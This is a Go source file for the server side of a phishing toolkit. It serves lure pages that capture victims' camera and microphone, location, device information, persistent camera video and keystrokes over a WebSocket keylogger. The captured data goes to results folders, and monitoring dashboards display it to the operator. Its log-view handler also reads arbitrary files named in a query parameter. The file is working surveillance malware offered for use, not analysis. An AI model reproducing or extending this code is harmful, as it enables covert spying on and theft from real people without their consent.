package internal

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// StartPhishServer starts a web server on the given port and serves the given handler
func StartPhishServer(port string, handler http.Handler) {
	fmt.Printf("[+] Starting phishing server on http://localhost:%s\n", port)
	go func() {
		http.ListenAndServe(":"+port, handler)
	}()
}

// NewRouter returns a new mux.Router
func NewRouter() *mux.Router {
	r := mux.NewRouter()
	return r
}

// RegisterPhishingRoutes sets up all phishing and logging endpoints
func RegisterPhishingRoutes(r *mux.Router) {
	// Serve phishing templates
	r.PathPrefix("/cam_mic/").Handler(http.StripPrefix("/cam_mic/", http.FileServer(http.Dir("templates/cam_mic"))))
	r.PathPrefix("/location/").Handler(http.StripPrefix("/location/", http.FileServer(http.Dir("templates/location"))))
	r.PathPrefix("/keylogger/").Handler(http.StripPrefix("/keylogger/", http.FileServer(http.Dir("templates/keylogger"))))
	r.PathPrefix("/device_info/").Handler(http.StripPrefix("/device_info/", http.FileServer(http.Dir("templates/device_info"))))
	r.PathPrefix("/persistent_cam/").Handler(http.StripPrefix("/persistent_cam/", http.FileServer(http.Dir("templates/persistent_cam"))))
	r.PathPrefix("/media/").Handler(http.StripPrefix("/media/", http.FileServer(http.Dir("results/persistent_streams"))))

	// Logging endpoints
	r.HandleFunc("/log/cam_mic", logCamMicHandler).Methods("POST")
	r.HandleFunc("/log/location", logLocationHandler).Methods("POST")
	r.HandleFunc("/log/device", logDeviceHandler).Methods("POST")
	r.HandleFunc("/log/persistent_cam", logPersistentCamHandler).Methods("POST")
	r.HandleFunc("/log/persistent_cam_media", logPersistentCamMediaHandler).Methods("POST")
	// Keylogger WebSocket endpoint
	r.HandleFunc("/ws/keylogger", keyloggerWSHandler)

	// Monitoring endpoints
	r.HandleFunc("/monitor/cam_mic", monitorCamMicHandler)
	r.HandleFunc("/monitor/location", monitorLocationHandler)
	r.HandleFunc("/monitor/keylogs", monitorKeylogsHandler)
	r.HandleFunc("/monitor/device_info", monitorDeviceInfoHandler)
	r.HandleFunc("/monitor/persistent_cam", monitorPersistentCamHandler)
	// Add monitor view handler for viewing individual log files
	r.HandleFunc("/monitor/view", MonitorViewHandler)
}

// --- Logging Handlers ---
func logCamMicHandler(w http.ResponseWriter, r *http.Request) {
	data, _ := ioutil.ReadAll(r.Body)
	os.WriteFile(filepath.Join("results/cam_mic_logs", "cam_mic_"+timestampString()+".json"), data, 0644)
}

func logLocationHandler(w http.ResponseWriter, r *http.Request) {
	data, _ := ioutil.ReadAll(r.Body)
	os.WriteFile(filepath.Join("results/location_logs", "location_"+timestampString()+".json"), data, 0644)
}

func logDeviceHandler(w http.ResponseWriter, r *http.Request) {
	data, _ := ioutil.ReadAll(r.Body)
	os.WriteFile(filepath.Join("results/device_logs", "device_"+timestampString()+".json"), data, 0644)
}

func logPersistentCamHandler(w http.ResponseWriter, r *http.Request) {
	data, _ := ioutil.ReadAll(r.Body)
	os.WriteFile(filepath.Join("results/persistent_streams", "persistent_"+timestampString()+".json"), data, 0644)
}

// --- Media Upload Handler for Persistent Cam ---
func logPersistentCamMediaHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(32 << 20)
	file, handler, err := r.FormFile("media")
	if err != nil {
		w.WriteHeader(400)
		return
	}
	defer file.Close()
	out, err := os.Create(filepath.Join("results/persistent_streams", time.Now().Format("20060102_150405_"+handler.Filename)))
	if err != nil {
		w.WriteHeader(500)
		return
	}
	defer out.Close()
	_, _ = io.Copy(out, file)
	w.WriteHeader(200)
}

// --- Keylogger WebSocket Handler ---
var upgrader = websocket.Upgrader{}

func keyloggerWSHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		os.WriteFile(filepath.Join("results/keylogs", "keylog_"+timestampString()+".txt"), msg, 0644)
	}
}

// --- Monitoring Handlers ---
func monitorCamMicHandler(w http.ResponseWriter, r *http.Request)         { serveMonitorUI(w, "results/cam_mic_logs", "Camera/Mic Events") }
func monitorLocationHandler(w http.ResponseWriter, r *http.Request)       { serveMonitorUI(w, "results/location_logs", "Location Events") }
func monitorKeylogsHandler(w http.ResponseWriter, r *http.Request)        { serveMonitorUI(w, "results/keylogs", "Keylogger Events") }
func monitorDeviceInfoHandler(w http.ResponseWriter, r *http.Request)     { serveMonitorUI(w, "results/device_logs", "Device Info Events") }
func monitorPersistentCamHandler(w http.ResponseWriter, r *http.Request)  {
	if r.URL.Query().Get("media") == "1" {
		serveMonitorMediaUI(w, "results/persistent_streams", "Persistent Cam Media")
		return
	}
	serveMonitorUI(w, "results/persistent_streams", "Persistent Cam Events")
}

func serveMonitorUI(w http.ResponseWriter, folder, title string) {
	files, _ := filepath.Glob(filepath.Join(folder, "*"))
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte("<html><head><title>" + title + "</title><style>body{font-family:sans-serif;background:#181c20;color:#fff;}h2{color:#00bfff;}pre{background:#23272b;padding:1em;border-radius:8px;overflow-x:auto;}a{color:#00bfff;}</style></head><body>"))
	w.Write([]byte("<h2>" + title + "</h2>"))
	for _, f := range files {
		w.Write([]byte("<div><b>" + filepath.Base(f) + "</b> - <a href='/monitor/view?file=" + f + "' target='_blank'>View</a></div>"))
	}
	w.Write([]byte("</body></html>"))
}

func serveMonitorMediaUI(w http.ResponseWriter, folder, title string) {
	files, _ := filepath.Glob(filepath.Join(folder, "*.webm"))
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte("<html><head><title>" + title + "</title><style>body{font-family:sans-serif;background:#181c20;color:#fff;}h2{color:#00bfff;}video{display:block;margin:1em auto;max-width:90%;}</style></head><body>"))
	w.Write([]byte("<h2>" + title + "</h2>"))
	for _, f := range files {
		w.Write([]byte("<div><b>" + filepath.Base(f) + "</b><br><video src='/media/" + filepath.Base(f) + "' controls></video></div>"))
	}
	w.Write([]byte("</body></html>"))
}

// View individual log file
func MonitorViewHandler(w http.ResponseWriter, r *http.Request) {
	file := r.URL.Query().Get("file")
	if file == "" { w.WriteHeader(400); return }
	data, err := os.ReadFile(file)
	if err != nil { w.WriteHeader(404); return }
	w.Header().Set("Content-Type", "text/plain")
	w.Write(data)
}

func timestampString() string {
	return time.Now().Format("20060102_150405")
}
